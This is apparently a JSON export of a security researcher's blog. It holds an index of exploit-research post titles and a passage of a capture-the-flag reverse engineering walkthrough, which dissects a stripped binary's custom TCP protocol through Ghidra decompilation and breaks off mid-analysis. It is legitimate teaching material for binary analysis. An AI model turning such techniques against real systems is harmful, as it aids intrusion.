{"/":{"title":"ðŸ‘¾ KIKS.","content":"\n## Content\n- [[notes/Android Deserialization Deep Dive]]\n- [[notes/Android Deep Dive - Deep and App Linking]]\n- [[notes/Android Deep Dive - Implicit Intents]]\n- [[notes/Not All Roads Lead to PWN2OWN - CGI Fuzzing, AFL and ASAN (Part 3)]]\n- [[notes/Not All Roads Lead to PWN2OWN - Firmware Reverse Engineering (Part 2)]]\n- [[notes/Not All Roads Lead to PWN2OWN - Hardware Hacking (Part 1)]]\n- [[notes/Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge]]\n- [[notes/A Reverse Engineering Journey Walkthrough]]\n- [[notes/DirtyCred File Exploitation applied on an io_uring UAF - CVE-2022-2602]]\n- [[notes/Linux Kernel n-day exploit development (CVE-2020-27786)]]\n- [[notes/Hunting for Linux Kernel public vulnerabilities]]\n- [[notes/KRWX - Kernel Read Write Execute]]\n- [[notes/Android Internals IPC - Binder and Service Manager Perspective]]\n- [[notes/Android Internals IPC - Introduction]]\n- [[notes/Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)]]\n- [[notes/Moodle Server-Side Request Forgery (SSRF)]]\n- [[notes/TIM Mobile Phone Geolocalization]]\n- [[notes/Rusty Joomla Remote Code Execution]]\n- [[notes/How To Write FUD Malware (Thesis)]]\n\n## About\n- @kiks - VR - Trying to break stuff since ~2k16.\n- kiks.zero (at) proton.me\n- [github](https://github.com/kiks7)\n- [twitter](https://twitter.com/kiks7_7)\n\u003e This, the thrill of pwning a system, this is the greatest rush.","lastmodified":"2025-04-14T14:14:33.953126353Z","tags":null},"/Untitled":{"title":"","content":"","lastmodified":"2025-04-14T14:14:33.953126353Z","tags":null},"/notes/A-Reverse-Engineering-Journey-Walkthrough":{"title":"A Reverse Engineering Journey Walkthrough","content":"\n## Introduction\nThis blog post is about a manually Reverse Engineered challenge I have written for this year [NoHat24](https://www.nohat.it/) security conference. The conference was a blast and we also did (as [Hacktive Security](https://www.hacktivesecurity.com/)) our best to contribute also with a [worskhop](https://www.nohat.it/workshops#alessandro_groppo) on Linux Kernel Fuzzing. The challenge is a compiled C/C++ binary that implements a custom TCP protocol that can be reversed and exploited to obtain the flag. The blog post objective is to guide a beginner person with a step by step and detailed walkthrough of the whole Reverse Engineering journey, dealing with a statically compiled binary. For the best experience, it is highly suggested to download the target binary from [here TODO ](TODO) and try to replicate described steps.\n\n## The beginning of the journey\nFirst things  first, let's see what our binary is with a simple `file` command:\n\n```bash\n$ file challenge\nchallenge: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=975594a6398b8d39078294cbd2a09f100dfd6643, for GNU/Linux 3.2.0, stripped\n```\n\nWe can immediately take some notes on few things that are interesting for the reverse engineering phase: the binary is **static** (e.g. not linked with dynamic libraries) and **stripped** (e.g. no symbols). Both things will make it harder to understand the inner logic of the targeted program.\n\nAlso, the `strings` utility suggests that we are dealing with C++ too:\n```bash\n$ strings challenge | grep std\n# ...\nstd::bad_alloc\nstd::bad_array_new_length\nstd::bad_cast\nstd::bad_typeid\nstd::allocator\nstd::basic_string\nstd::string\n# ...\n```\n### First approach\nAfter having opened the binary in Ghidra and having identified its `main` function (`FUN_00405b16`) , it is possible to understand the first behaviors through logging strings:\n```C\nundefined8 FUN_00405b16(void)\n{\n  undefined4 uVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined4 local_48;\n  undefined4 local_44;\n  int local_40;\n  int local_3c;\n  undefined2 local_38;\n  undefined2 local_36;\n  undefined4 local_34;\n  undefined local_28 [24];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_40 = FUN_00524bf0(2,1,0);\n  local_48 = 1;\n  uVar1 = FUN_0051b890(0);\n  FUN_004cf660(uVar1);\n  if (local_40 \u003c 0) {\n    uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Failed to create socket\");\n    FUN_004753c0(uVar3,FUN_00476340);\n  }\n  else {\n    iVar2 = FUN_00524bb0(local_40,1,2,\u0026local_48,4);\n    if (iVar2 \u003c 0) {\n      uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Failed to setsockopt on socket\");\n      FUN_004753c0(uVar3,FUN_00476340);\n    }\n    else {\n      thunk_FUN_004ef5e0(\u0026local_38,0,0x10);\n      local_38 = 2;\n      local_34 = 0;\n      local_36 = FUN_005257d0(0x51);\n      iVar2 = FUN_005249d0(local_40,\u0026local_38,0x10);\n      if (iVar2 \u003c 0) {\n        uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Bind failed\");\n        FUN_004753c0(uVar3,FUN_00476340);\n        FUN_005216a0(local_40);\n      }\n      else {\n        iVar2 = FUN_00524a00(local_40,5);\n        if (-1 \u003c iVar2) {\n          uVar3 = FUN_00476a40(\u0026DAT_005cacc0,\"Server listening..\");\n          FUN_004753c0(uVar3,FUN_00476340);\n          do {\n            while( true ) {\n              local_44 = 0x10;\n              local_3c = FUN_00524930(local_40,local_28,\u0026local_44);\n              if (-1 \u003c local_3c) break;\n              uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Accept failed\");\n              FUN_004753c0(uVar3,FUN_00476340);\n            }\n            uVar3 = FUN_00476a40(\u0026DAT_005cacc0,\"Connection accepted\");\n            FUN_004753c0(uVar3,FUN_00476340);\n            FUN_0040597c(local_3c);\n            FUN_005216a0(local_3c);\n          } while( true );\n        }\n        uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Listen failed\");\n        FUN_004753c0(uVar3,FUN_00476340);\n        FUN_005216a0(local_40);\n      }\n    }\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    FUN_005256e0();\n  }\n  return 1;\n}\n```\n\nSince the binary is statically linked and stripped, common libc functions do not have explicit names and needs to be reconstructed. To perform such operation, strings can be used to guess the function name and can be confirmed through a more reliable method: go to the function definition and extract the `eax` register used in the `syscall` instruction. For example, the function `FUN_00524930` can be guessed as an `accept` syscall through the `Accept failed` log message (hence, the `FUN_00476a40` is something log related) and confirmed with its assembly, where `0x2d` corresponds to the `accept` syscall ([Linux kernel syscall tables](https://syscalls.mebeim.net/?table=x86/64/x64/v6.7)):\n\n```asm\n0052493d: MOV EAX,0x2b\n00524942: SYSCALL\n```\n\n Also, the first accepted parameter of the `accept` syscall is a `socket` file descriptor and can be used to identify the `socket` call at `FUN_00524bf0` since the returned value is assigned into the `local_40` variable.\n\n```C\n\nundefined8 main(void)\n\n{\n  undefined4 uVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined4 local_48;\n  undefined4 local_44;\n  int socket;\n  int sock_accept;\n  undefined2 local_38;\n  undefined2 local_36;\n  undefined4 local_34;\n  undefined local_28 [24];\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  socket = ::socket(2,1,0);\n  local_48 = 1;\n  uVar1 = FUN_0051b890(0);\n  FUN_004cf660(uVar1);\n  if (socket \u003c 0) {\n    uVar3 = may_log(\u0026DAT_005caba0,\"Failed to create socket\");\n    jmp_rsi(uVar3,FUN_00476340);\n  }\n  else {\n    iVar2 = FUN_00524bb0(socket,1,2,\u0026local_48,4);\n    if (iVar2 \u003c 0) {\n      uVar3 = may_log(\u0026DAT_005caba0,\"Failed to setsockopt on socket\");\n      jmp_rsi(uVar3,FUN_00476340);\n    }\n    else {\n      thunk_FUN_004ef5e0(\u0026local_38,0,0x10);\n      local_38 = 2;\n      local_34 = 0;\n      local_36 = FUN_005257d0(0x51);\n      iVar2 = bind(socket,\u0026local_38,0x10);\n      if (iVar2 \u003c 0) {\n        uVar3 = may_log(\u0026DAT_005caba0,\"Bind failed\");\n        jmp_rsi(uVar3,FUN_00476340);\n        close(socket);\n      }\n      else {\n        iVar2 = listen(socket,5);\n        if (-1 \u003c iVar2) {\n          uVar3 = may_log(\u0026DAT_005cacc0,\"Server listening..\");\n          jmp_rsi(uVar3,FUN_00476340);\n          do {\n            while( true ) {\n              local_44 = 0x10;\n              sock_accept = accept(socket,local_28,\u0026local_44);\n              if (-1 \u003c sock_accept) break;\n              uVar3 = may_log(\u0026DAT_005caba0,\"Accept failed\");\n              jmp_rsi(uVar3,FUN_00476340);\n            }\n            uVar3 = may_log(\u0026DAT_005cacc0,\"Connection accepted\");\n            jmp_rsi(uVar3,FUN_00476340);\n            FUN_0040597c(sock_accept);\n            close(sock_accept);\n          } while( true );\n        }\n        uVar3 = may_log(\u0026DAT_005caba0,\"Listen failed\");\n        jmp_rsi(uVar3,FUN_00476340);\n        close(socket);\n      }\n    }\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return 1;\n}\n```\n\nBy applying these techniques on the entire `main` function, we can obtain a much more cleaner code and identify two key parts:\n- The server uses an `AF_INET` socket and binds to port `81` (`\u0026local_38` is a `struct sockaddr *`). The `81` port can be quickly identified, without a proper cast, through the `local_36` variable that is instead an offset of the `local_38` stack variable.\n- The file descriptor returned from the `accept` syscall (the client connection) is parsed through the `FUN_0040597c` function that can be renamed, for that reason, to `parse_client_message`.\n\n### Parse client message\n```C\nvoid parse_client_message(int socket)\n\n{\n  char cVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined local_228 [4];\n  char local_224;\n  ushort local_222;\n  undefined local_118 [264];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  thunk_FUN_004ef5e0(local_118,0,0x108);\n  iVar2 = FUN_00524a30(socket,local_118,0x108,0);\n  if (iVar2 \u003c 0) {\n    uVar3 = may_log(\u0026DAT_005caba0,\"Error reading from socket\");\n    jmp_rsi(uVar3,FUN_00476340);\n    close(socket);\n  }\n  else {\n    FUN_00405f5e(local_228);\n    cVar1 = FUN_00405f8e(local_228,local_118,(long)iVar2);\n    if (cVar1 == '\\x01') {\n      FUN_00406018(local_228);\n      if (local_224 == 0x10) {\n        FUN_00405453(local_228);\n      }\n      else if (local_224 == 0x20) {\n        FUN_00405520(local_228);\n      }\n      else {\n        local_222 = 0;\n      }\n      FUN_00524af0(socket,local_228,(ulong)local_222 + 8,1);\n    }\n    else {\n      uVar3 = may_log(\u0026DAT_005caba0,\"Invalid message received\");\n      jmp_rsi(uVar3,FUN_00476340);\n    }\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n```\n\nThe newly identified `parse_client_message` function seems to do what we have guessed: parse a message received from the client (`Error reading from socket` where `FUN_00524a30` is `recvfrom`) and perform some validation (e.g. `Invalid message received`).\nBy applying the same techniques previously described we can make further assumptions:\n- `local_118` is the second parameter of the `recvfrom` syscall. Since the second parameter of `recvfrom` is a `char*` buffer we can safely rename it to `buffer` and change its type (using the Ghidra `Retype Variable`) to `char[256]`.\n- The `FUN_00405f5e` seems to init a structure (or object since we are dealing with C++) inside the `undefined` stack variable `local_228` (now renamed to `undefined_obj`). \n- The just initialized `undefined_obj` is used as the first parameter to the function `FUN_00405f8e` that accepts two more parameters: the `buffer` passed to the `recvfrom` and its returned result (e.g. number of received bytes) through the local `iVar3` (renamed to `bytes_received`). We can use these information to retype the targeted function signature with appropriate parameter types.\n\n### Initialize an undefied object\n```C\nundefined8 FUN_00405f8e(undefined8 *undefined_obj,char *buffer,ulong param_3)\n\n{\n  undefined8 uVar1;\n  \n  if (param_3 \u003c 8) {\n    uVar1 = 0;\n  }\n  else {\n    *undefined_obj = *(undefined8 *)buffer;\n    if (*(short *)undefined_obj == -0x9a) {\n      if (*(ushort *)((long)undefined_obj + 6) \u003c 0x101) {\n        thunk_FUN_004ef2e0(undefined_obj + 1,buffer + 8,*(short *)((long)undefined_obj + 6));\n        uVar1 = 1;\n      }\n      else {\n        uVar1 = 0;\n      }\n    }\n    else {\n      uVar1 = 0;\n    }\n  }\n  return uVar1;\n}\n```\n\nFunction `FUN_00405f8e` first checks that `param_3` is more than `8` bytes and returns `0` otherwise. \nThe first `if` condition is misleading through the decompiled code, but much more clear from the assembly instruction: `CMP AX, 0xff66`. We are checking that the first bytes of the received buffer contains the `0xff66` constant (some sort of a magic value?)  and returning `0` if not. The next conditional statement is checking 2 bytes (deduced from the `ushort` cast of the offset access and confirmed from the `AX` usage inside `CMP AX,0x100`). If the extracted value at offset `0x6` is below `0x101` (256 in decimal, a classic buffer size :}) we continue with a weird call to `thunk_FUN_004ef2e0` and we set the return result (`uVar1` now renamed to `ret`) to 1. \n\nThe `thunk_FUN_004ef2e0` function is not that straightforward to understand and can be statically identified by deeply reversing the function or dynamically using a debugger and verifying its behavior. It is accepting three parameters:\n1. `undefined_obj + 1` where the `+1` is not properly \"correct\". Since we are presumably dealing with an object, it should be treated as a `void*`. By re-typing the value to a more appropriate type, it become `undefined_obj + 8` as the assembly instruction.\n2. `buffer + 8` that is the same offset as the first parameter.\n3. `undefined_obj + 6` that has been previously discussed and could be some sort of size (due to the `256` constant).\n\nIt seems that the first 2 parameters are some sort of source and destination (also dealing with the same offset) and the last parameter a size. Is it a `memcpy`? A quick session with `gdb` actually reveals that the behavior, and the function signature, match the `memcpy` function call. Nice!\n\n### Scratching the structure definition\nWith these first hints, we can perform some asssumptions:\n1. First bytes of the received buffer should contains a magic value `0xff66` that corresponds to 2 bytes (16 bits).\n2. At offset `0x6` we should have a size related field of 2 bytes (remember the previous `CMP, 0x100` instruction and the `memcpy` parameter).\n3. Starting from offset `0x8`, we are copying the entire buffer, for a maximum of `256` bytes, inside our undefined object.\n\nWith that information, we can start creating a potential structure from `Data Type Manager` =\u003e `Data Types` =\u003e `challenge` =\u003e `New` =\u003e `Structure`:\n\n![[notes/images/rev/1.png]]\n\nAfter the creation of the new structure and the retype of the `undefined_obj`, we have a much cleaner and easier to understand function (renamed into `copy_from_buffer`). Also, we can retype the same value from the caller function and all subsequent calls.\n\n```C\nundefined8 copy_from_buffer(struct custom_message *undefined_obj,char *buffer,ulong param_3)\n\n{\n  undefined8 buffer_ptr;\n  \n  if (param_3 \u003c 8) {\n    buffer_ptr = 0;\n  }\n  else {\n    buffer_ptr = *(undefined8 *)buffer;\n    undefined_obj-\u003emagic = (short)buffer_ptr;\n    undefined_obj-\u003eundefined[0] = (char)((ulong)buffer_ptr \u003e\u003e 0x10);\n    undefined_obj-\u003eundefined[1] = (char)((ulong)buffer_ptr \u003e\u003e 0x18);\n    undefined_obj-\u003eundefined[2] = (char)((ulong)buffer_ptr \u003e\u003e 0x20);\n    undefined_obj-\u003eundefined[3] = (char)((ulong)buffer_ptr \u003e\u003e 0x28);\n    undefined_obj-\u003esize = (short)((ulong)buffer_ptr \u003e\u003e 0x30);\n    if (undefined_obj-\u003emagic == 0xff66) {\n      if (undefined_obj-\u003esize \u003c 0x101) {\n        memcpy(undefined_obj-\u003epayload,buffer + 8,undefined_obj-\u003esize);\n        buffer_ptr = 1;\n      }\n      else {\n        buffer_ptr = 0;\n      }\n    }\n    else {\n      buffer_ptr = 0;\n    }\n  }\n  return buffer_ptr;\n}\n```\n**Note:** `buffer_ptr` is a rename to make it easier to read the code after the `else` statement. However, it is also used form the same routine as the return result variable. For that reason, it is returning `buffer_ptr` but instead it is `0` or `1`.\n\n### More parsing\nComing back to the renamed `parse_client_message`, a conditional statement verifies the content of `undefined_obj.undefined[2]` against `0x10` or `0x20`. If it doesn't match any of these two values, it will set the `size` object value to 0 and continue the execution. The execution, shared also with the two conditional cases, goes directly into a `sendto` syscall (renamed from `FUN_00524af0`):\n```C\nsendto(socket,\u0026undefined_obj,(ulong)undefined_obj.size + 8,0);\n```\n\nThe sent buffer is the same object we are analyzing and the number of bytes to be sent through the `sendto` syscall (third parameter) is the `undefined_obj.size` previously set to zero plus `0x8`.\n\nIf the condition matches `0x10` the routine calls `FUN_00405453` or `FUN_00405520` if it matches `0x20` and they both accept the address of the `undefined_obj` as a parameter. Also, from that condition, we can continue to add information on our structure. We are accessing the byte (due to the `MOVZXZ EAX, AL` before the `CMP` instruction) at offset `0x2` of the `undefined` member.  We can add a member on our `struct custom_message` with the name of `command`, since it seems to redirect the execution based on its value, and put a size of `uint8_t` due to the `AL` register access and the comparison of the two hexadecimal values:\n\n![[notes/images/rev/2.png]]\n\n### Command 0x10\nWe can rename `FUN_00405453` to `command_0x10` and `FUN_00405520` to `command_0x20`. This is useful to simplify further references.\n\n```C\nvoid command_0x10(struct custom_message *obj)\n{\n  int iVar1;\n  ushort *puVar2;\n  byte bVar3;\n  long in_FS_OFFSET;\n  ushort local_22;\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  local_22 = *(ushort *)obj-\u003eundefined;\n  if ((local_22 \u003c 0x100) || (0x900 \u003c local_22)) {\n    obj-\u003esize = 0;\n  }\n  else {\n    iVar1 = FUN_004cf650();\n    bVar3 = (char)iVar1 + (char)(iVar1 / 0x3f) * -0x3f;\n    puVar2 = (ushort *)FUN_004060a8(\u0026DAT_005c9d80,\u0026local_22);\n    *puVar2 = (ushort)bVar3;\n    obj-\u003esize = 2;\n    obj-\u003epayload[0] = '\\x01';\n    obj-\u003epayload[1] = bVar3;\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n```\n\nThe first thing we can see, after having retyped the parameter into `struct custom_message*`, as observed from the caller, is the dereference of `obj-\u003eundefined` as a `ushort` (2 bytes). The first validation is that that value is between `0x100` and `0x900`, otherwise we return while setting the object size to `0x0`. If the validation step is valid the things become more confusing:\n1. The result of `FUN_004cf650` (`iVar1`) is divided by `0x3f` and summed with itself, then multiplied with `0x3f` (=\u003e`bVar3`) and the result is stored in the pointer returned from `FUN_004060a8`.\n2.  `FUN_004060a8` involves two parameters: a global variable (due to its `.bss` section location)  `DAT_005c9d8` and the byte extracted from `obj-\u003eundefined` as the second parameter. \n\nThe `DAT_005c9d8` address, by seeing its references, is also used in the function `command_0x20` but in the opposite way: instead of storing a value inside the returned pointer, it retrieves it, always using the `obj-\u003eundefined` member of our declared structure. Since the internals of the `FUN_004060a8` are pretty confusing, let's superficially rename the function  into a generic `store_and_get` and proceed the analysis. After storing the calculated value, the object parameter is directly modified: its `size` to `0x2`, `payload[0]` to `0x1` and `obj-\u003epayload[1]` with the calculated value. By seeing the `payload` access we can suppose that we have two more `byte` members instead of the remaining `char`. A weird thing is that now the `structure-\u003epayload` become `char[254]`, a weird size for a payload, but that's what we are observing. Since we know the logic behind the second parameter, we can rename its newly created member at that offset with `calculated_value`, leaving the other one with an undefined logic with `undefined_3`.\n\n![[notes/images/rev/3.png]]\n\nAfter returning to `parse_client_message`, as observed before, the modified object is sent back to the client. That means that the same object as input is used as output for the client socket.\n\n### Command 0x20\nIf `undefined_obj.command`, in `parse_client_message`, contains `0x20` instead, the function `command_0x20` is called:\n```C\nvoid command_0x20(struct custom_message *obj)\n{\n  byte bVar1;\n  char cVar2;\n  int iVar3;\n  undefined2 *puVar4;\n  undefined8 uVar5;\n  long in_FS_OFFSET;\n  undefined2 local_168;\n  ushort local_166;\n  int local_164;\n  int local_160;\n  int local_15c;\n  int local_158;\n  int local_154;\n  int local_150;\n  undefined4 local_14c;\n  undefined4 local_148;\n  int local_144;\n  long local_140;\n  undefined local_138 [16];\n  undefined8 local_128;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_168 = *(undefined2 *)obj-\u003eundefined;\n  puVar4 = (undefined2 *)store_and_get(\u0026DAT_005c9d80,\u0026local_168);\n  bVar1 = (byte)*puVar4;\n  if (bVar1 == 0) {\n    obj-\u003esize = 0;\n  }\n  else {\n    local_14c = 3;\n    local_138 = (undefined  [16])0x0;\n    local_128 = 0;\n    local_166 = 0;\n    local_164 = 0;\n    local_140 = 0;\n    local_160 = 0;\n    local_15c = 0;\n    while ((((local_15c \u003c 3 \u0026\u0026\n             (local_166 = (ushort)obj-\u003epayload[(long)local_164 + -2],\n             (int)(uint)local_166 \u003c= 0xff - local_164)) \u0026\u0026 (local_166 \u003c obj-\u003esize)) \u0026\u0026\n           (local_166 != 0))) {\n      local_140 = FUN_004ed140(local_166 + 1);\n      *(undefined *)(local_140 + (ulong)local_166) = 0;\n      memcpy(local_140,obj-\u003epayload + (long)local_164 + -1,local_166);\n      for (local_158 = 0; local_158 \u003c (int)(uint)local_166; local_158 = local_158 + 1) {\n        *(byte *)(local_140 + local_158) = *(byte *)(local_140 + local_158) ^ bVar1;\n      }\n      *(long *)(local_138 + (long)local_15c * 8) = local_140;\n      local_160 = local_160 + 1;\n      local_164 = local_164 + local_166 + 1;\n      local_15c = local_15c + 1;\n    }\n    if (local_160 \u003c 2) {\n      obj-\u003esize = 0;\n    }\n    else {\n      local_154 = 0;\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\u0026DAT_00568030);\n      if (iVar3 == 0) {\n        local_154 = 0x40;\n      }\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\u0026DAT_00568035);\n      if (iVar3 == 0) {\n        local_154 = 0x41;\n      }\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\"write\");\n      if (iVar3 == 0) {\n        local_154 = 0x42;\n      }\n      local_148 = 0;\n      if (local_154 == 0x42) {\n        uVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n        jmp_rsi(uVar5,FUN_00476340);\n      }\n      else if (local_154 \u003c 0x43) {\n        if (local_154 == 0x40) {\n          obj-\u003esize = 1;\n          cVar2 = FUN_00405355(local_138._8_8_);\n          if (cVar2 == '\\x01') {\n            obj-\u003eundefined_3 = 1;\n          }\n          else {\n            obj-\u003eundefined_3 = 0;\n          }\n        }\n        else if (local_154 == 0x41) {\n          if (local_160 == 3) {\n            local_148 = FUN_004ce310(local_128);\n            local_144 = FUN_004053be(\u0026obj-\u003eundefined_3,local_138._8_8_,local_148);\n            if (local_144 == 0) {\n              obj-\u003esize = 0;\n            }\n            else {\n              obj-\u003esize = (uint16_t)local_144;\n              for (local_150 = 0; local_150 \u003c local_144; local_150 = local_150 + 1) {\n                obj-\u003epayload[(long)local_150 + -2] = obj-\u003epayload[(long)local_150 + -2] ^ bVar1;\n              }\n            }\n          }\n          else {\n            obj-\u003esize = 0;\n          }\n        }\n      }\n    }\n  }\n  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_check();\n}\n```\n\nIn this case, we are dealing with a much longer function. `store_and_get` function is the first one that is called and retrieve its value, maybe based on the `obj-\u003eundefined` value. We can then rename `pVar1` with `stored_value` and we can see that if it is `0x0`, the function sets `obj-\u003esize` to `0x0` and return, a common pattern also identified previously that seems to be related to some sort of failure in the message validation process. That means that the `store_and_get` function must return something to proceed (**hence we need to first call `command_0x10` to set it?**).\n\n#### The tedious while loop\nThe first while loop inside the `command_0x20` seems like one of the first main blocks of the function and contains a pretty confusing condition, let's cut it down: \n\n```C\nlocal_164 = 0;\nlocal_15c = 0;    \nwhile (\n\t(\n\t\t(\n\t\t\t(local_15c \u003c 3 \u0026\u0026\n\t\t\t(local_166 = obj-\u003epayload[local_164 - 2], local_166 \u003c= 0xff - local_164)) \u0026\u0026 \n\t\t\t(local_166 \u003c obj-\u003esize)\n\t\t)\n\t\t  \u0026\u0026\n\t   (local_166 != 0))\n) {\n  // ..\n  memcpy(local_140,obj-\u003epayload + (long)local_164 + -1,local_166);\n  local_164 = local_164 + local_166 + 1;\n  local_15c = local_15c + 1;\n}\n```\n\nStep by step:\n1. `local_15c` is zero initialized, incremented inside the loop and checked if it is less than `3`. It is clearly an `index` that tells us that it will loop through the cycle at least 3 times. Let's rename it to `idx`.\n2. `local_166` is assigned to  `obj-\u003epayload[local_164 - 2]`, where `local_164` is first initialized with 0 and then incremented with `1` and the value of `local_166` inside the loop.  `local_166` is later used as the size parameter of the `memcpy` function, while `local_164` as an offset to `obj_payload` as the source argument.\n\t1. Since the two local variables are pretty confusing, let's start renaming things into something more easy to read with the limited information we have gathered: `memcpy_size` and `memcpy_source_offset`.\n\n```C\nmemcpy_source_offset = 0;\nlocal_15c = 0;    \nwhile (\n\t(\n\t\t(\n\t\t\t(local_15c \u003c 3 \u0026\u0026\n\t\t\t(memcpy_size = obj-\u003epayload[memcpy_source_offset - 2], memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 \n\t\t\t(memcpy_size \u003c obj-\u003esize)\n\t\t)\n\t\t  \u0026\u0026\n\t   (memcpy_size != 0))\n) {\n  // ..\n  memcpy(local_140,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  local_15c = local_15c + 1;\n}\n```\n\nNow we can use more meaningful names and things are more clear:\n\n3. `memcpy_size` is retrieved at each loop through an offset (`memcpy_source_offset`) inside the `obj-\u003epayload`. Given these two variables, the content of `obj-\u003epayload` is copied inside the `local_140` variable (dynamic parsing).\n\t- Also, `memcpy_size` must not be zero or more than `0xff - memcpy_source_offset` to continue the loop.\n\nLet's see more code to understand the entire loop process:\n```C\nlocal_138 = (undefined  [16])0x0;\nwhile ((((idx \u003c 3 \u0026\u0026\n\t\t (memcpy_size = (ushort)obj-\u003epayload[(long)memcpy_source_offset + -2],\n\t\t (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n\t   \u0026\u0026 (memcpy_size != 0))) {\n  local_140 = FUN_004ed140(memcpy_size + 1);\n  *(undefined *)(local_140 + (ulong)memcpy_size) = 0;\n  memcpy(local_140,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  for (local_158 = 0; local_158 \u003c (int)(uint)memcpy_size; local_158 = local_158 + 1) {\n\t*(byte *)(local_140 + local_158) = *(byte *)(local_140 + local_158) ^ bVar1;\n  }\n  *(long *)(local_138 + (long)idx * 8) = local_140;\n  local_160 = local_160 + 1;\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  idx = idx + 1;\n}\n```\n\n4. `local_140` is assigned with the result of the `FUN_004ed140` with the `memcpy_size` as the parameter. Identify this function is easy as just open the function and see the error log with `\"malloc.c\",0xd17,\"__libc_malloc\"` on it. We can rename it to `malloc` and know that `local_140` holds a pointer to an allocated memory.\n\t1. We put a `0x0` value at the offset of `memcpy_size`. Maybe the NULL character at the end of the string.\n5. `local_140` is used as the destination of the previously described `memcpy` (renamed it to `memcpy_dest`).\n6. The next `for` loop iterates on each character copied inside the `memcpy_dest` pointer using `local_158` as an index (renamed to `inner_idx`) and XOR its with `stored_value`.\n\t1. Here we go! We have found how `stored_value` is used and we can rename it to `xor_key`. We can also rename the `obj-\u003eundefined` into something like `xor_key_derivate` since it is used to derive in some way (through the `store_and_get` function) the XOR key.\n7. Just after the `for` loop we have an assignment of the pointer `local_140` (now `memcpy_dest`) to `local_138` with the `idx` index multiplied by 8.  We can retype the `local_140` array (declared from ghidra as `undefined local_138 [16];`) into a `char*` for that reasons (and rename it into `char_ptr_array`):\n\t2. We are storing a pointer into each slot (the multiplication of 8 is the size of each entry e.g. the pointer size)\n\t3. We were NULL terminating the memory. That means that we are dealing with some sort of string parsing.\n8. Furthemore, `local_160` is incremented by 1 at each iteration and later checked against 2 (if it is less we return with `obj-\u003esize = 0`) and later again inside another loop. We don't know the context of it but at least know that, in order to continue the function flow, we need to iterate the loop at least 2 times. With poor fantasy, let's rename it `at_least_2`.\n\nFinally, the loop is far more readable:\n```C\nlocal_14c = 3;\nchar_ptr_array[0] = (char *)0x0;\nchar_ptr_array[1] = (char *)0x0;\nchar_ptr_array[2] = (char *)0x0;\nmemcpy_size = 0;\nmemcpy_source_offset = 0;\nmemcpy_dest = (char *)0x0;\nat_least_2 = 0;\nidx = 0;\nwhile ((((idx \u003c 3 \u0026\u0026\n\t\t (memcpy_size = (ushort)obj-\u003epayload[(long)memcpy_source_offset + -2],\n\t\t (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n\t   \u0026\u0026 (memcpy_size != 0))) {\n  memcpy_dest = (char *)malloc(memcpy_size + 1);\n  memcpy_dest[memcpy_size] = '\\0';\n  memcpy(memcpy_dest,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  for (inner_idx = 0; inner_idx \u003c (int)(uint)memcpy_size; inner_idx = inner_idx + 1) {\n\tmemcpy_dest[inner_idx] = memcpy_dest[inner_idx] ^ stored_value;\n  }\n  char_ptr_array[idx] = memcpy_dest;\n  at_least_2 = at_least_2 + 1;\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  idx = idx + 1;\n}\n```\n#### More parsing\nTo summarize the previous loop, we have seen the parsing of the client message by splitting it into multiple \"chunks\" based on the message specified size (`memcpy_size` retrieved, and validated, directly from the message) and storing them inside a `char*` array: `char_ptr_array`. Let's continue our journey.\n\n```C\nif (at_least_2 \u003c 2) {\n  obj-\u003esize = 0;\n}\nelse {\n  local_154 = 0;\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\u0026DAT_00568030);\n  if (iVar3 == 0) {\n\tlocal_154 = 0x40;\n  }\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\u0026DAT_00568035);\n  if (iVar3 == 0) {\n\tlocal_154 = 0x41;\n  }\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\"write\");\n  if (iVar3 == 0) {\n\tlocal_154 = 0x42;\n  